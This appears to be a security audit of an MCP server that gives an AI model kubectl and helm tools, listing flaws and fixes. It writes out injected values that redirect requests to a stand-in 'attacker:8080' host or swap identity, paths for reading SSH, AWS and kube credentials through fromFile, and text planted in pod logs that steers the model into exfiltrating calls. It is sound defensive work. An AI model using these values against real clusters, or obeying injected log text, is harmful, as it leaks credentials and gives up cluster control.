reason: Every caller value in kubectl_apply sits in the value slot of a flag (-f, -n, --context), so kubectl consumes it as that flag's value even if it starts with '-'; no extra flag can be injected. execFileSync uses no shell.
fix: None needed for argument injection.

reason: resourceType and name go in as bare positionals with no check for a leading '-'. name='--all' deletes every resource of the type in the namespace, and resourceType can carry kubectl global flags such as --server/--token/--as/--kubeconfig, sending the request (and the bearer credential) somewhere else or acting as another identity.
fix: Reject resourceType/name that start with '-' or do not match ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$ (resourceType: ^[A-Za-z0-9.-]+$), and put '--' before the positional values.

reason: resourceType and name are two unvalidated positionals; e.g. resourceType='--server=http://attacker:8080', name='pods' runs a valid describe against an attacker host, or '--as=...'/'--kubeconfig=...' change identity/config.
fix: Validate both against a Kubernetes name regex, reject a leading '-', and insert '--' before positionals.

reason: kubectl_get (listed as a read-only tool) passes resourceType and name as bare positionals; resourceType='--server=http://attacker:8080' with name='pods' (or --as/--token/--kubeconfig) injects kubectl global flags into a still-valid command.
fix: Validate resourceType/name with strict regexes, reject a leading '-', put '--' before positionals.

reason: name is an unvalidated positional, so a value like '-lapp=x' or '--as=...' is parsed as a flag. Only one free positional exists here, so a redirect flag leaves kubectl logs without a pod and it errors out; impact is limited (selecting other pods' logs).
fix: Reject names starting with '-' / validate with a Kubernetes name regex; add '--' before the pod name.

reason: resourceType and name are bare positionals; one can carry a kubectl global flag (--server/--as/--token/--kubeconfig) while the other names the resource, so the patch is sent elsewhere or under another identity.
fix: Validate resourceType/name, reject a leading '-', insert '--' before positionals.

reason: subCommand is typed as an enum but never checked at runtime (the low-level Server does not validate inputSchema), so any string reaches kubectl. Because the resource token then lands in the subcommand slot, an injected flag leaves 'kubectl rollout' without a valid subcommand; no high-impact exploit shown.
fix: Check subCommand against the allowed list and resourceType against deployment|daemonset|statefulset in code; validate name.

reason: Same unvalidated subCommand/resourceType/name as F007 on the non-watch path; flag injection possible but no demonstrated impact beyond a failed command.
fix: Enforce the subCommand and resourceType enums in code and validate name.

reason: resourceType and name are bare positionals; resourceType='--server=http://attacker:8080' with name='deployment/x' is still a valid scale command, sent to an attacker host (or under --as/--kubeconfig).
fix: Validate resourceType/name with strict regexes, reject a leading '-', add '--'.

fix: Optional: use fs.mkdtempSync for an unpredictable temp dir.

reason: kubectl_generic runs any kubectl subcommand with any flags and args. Besides full cluster control, 'kubectl cp <pod>:<file> <local path>' writes arbitrary files on the MCP host, 'get secrets -o json' bypasses MASK_SECRETS, and --kubeconfig/--server/--as change credentials or target.
fix: Remove the tool or restrict it to an allowlist of read-only verbs (get, describe, top, explain) with an allowlist of flags; never allow cp, plugins, --kubeconfig, --server, --token, --as; require human approval.

reason: name is glued into a single '--selector=...' argument, so it cannot become a separate flag.
fix: Optionally validate name.

title: kubectl_create fromFile reads any file on the MCP host and returns it
reason: fromFile paths are passed straight to kubectl --from-file; with resourceType=configmap, fromFile=['k=/home/user/.kube/config'] (or ~/.aws/credentials, ~/.ssh/id_rsa) and dryRun=true, kubectl prints the file content as YAML back to the model. Without dry-run it stores the file in the cluster.
fix: Drop fromFile, or resolve each path with realpath and require it to be inside an operator-configured directory; never allow it in combination with model-supplied paths outside that directory.

title: Helm valuesFile reads any local file (cat) / any URL
reason: valuesFile is any host path (or URL for helm -f). Combined with an attacker-chosen chart/repo, a YAML file such as ~/.kube/config becomes chart values that the chart can render into a ConfigMap and apply to the cluster, where kubectl_get reads it back.
fix: Remove valuesFile or confine it to an allowlisted directory via realpath + containment check; reject URLs; read it with fs.readFileSync instead of spawning cat.

title: Read-only / non-destructive / ALLOWED_TOOLS modes only hide tools; they can still be called
reason: ALLOW_ONLY_READONLY_TOOLS, ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS and ALLOWED_TOOLS filter only tools/list; the tools/call handler dispatches every tool by name with no check, so a client (or injected prompt) that calls kubectl_generic, kubectl_delete or exec_in_pod directly bypasses the operator's restriction.
fix: Compute the allowed tool set once and reject any tools/call whose name is not in it, before dispatch.

title: HTTP/SSE transports: no auth by default and DNS-rebinding protection off
reason: When ENABLE_UNSAFE_STREAMABLE_HTTP_TRANSPORT or ENABLE_UNSAFE_SSE_TRANSPORT is set and MCP_AUTH_TOKEN is not, every request is accepted and there is no Host/Origin check by default, so a web page the user visits can reach the localhost server via DNS rebinding (or anyone on the network if HOST=0.0.0.0) and call kubectl_generic/exec_in_pod.
fix: Refuse to start HTTP transports without MCP_AUTH_TOKEN, enable DNS-rebinding protection by default with allowedHosts/allowedOrigins, and add the same Host/Origin check to the SSE server.

title: Helm release name / chart passed as bare positionals (template mode)
reason: name and chart are not checked for a leading '-'. In template mode the release name is optional, so name can be a helm flag (e.g. --post-renderer=<program>, which runs a local executable on the rendered chart, or --kube-apiserver/--kubeconfig) while chart still names a chart from the caller-supplied repo.
fix: Validate name with ^[a-z0-9]([-a-z0-9]*[a-z0-9])?$, reject a chart that starts with '-', and insert '--' before positionals.

title: Pod logs and command output returned raw to the model
reason: Container logs and exec output are written by workloads (and anyone who can make them log), and go into the model context unmarked; the same server offers kubectl_generic/exec_in_pod/kubectl_create with no approval, so injected text in a log can drive destructive or exfiltrating calls.
fix: Wrap returned logs as untrusted data (clearly delimited, truncated), and require human approval for write/exec tools.
